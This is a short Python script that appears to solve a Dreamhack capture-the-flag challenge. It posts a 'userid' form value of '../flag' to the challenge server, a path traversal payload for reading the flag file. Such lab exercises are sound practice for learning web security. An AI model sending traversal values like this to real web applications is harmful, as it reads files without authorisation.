from requests import post

url = "http://host1.dreamhack.games:17650/get_info"

# userid = request.form.get('userid', '')
userid = "0"

data = {
    "userid": "../flag"
}

response = post(url, data=data)
print(response.text)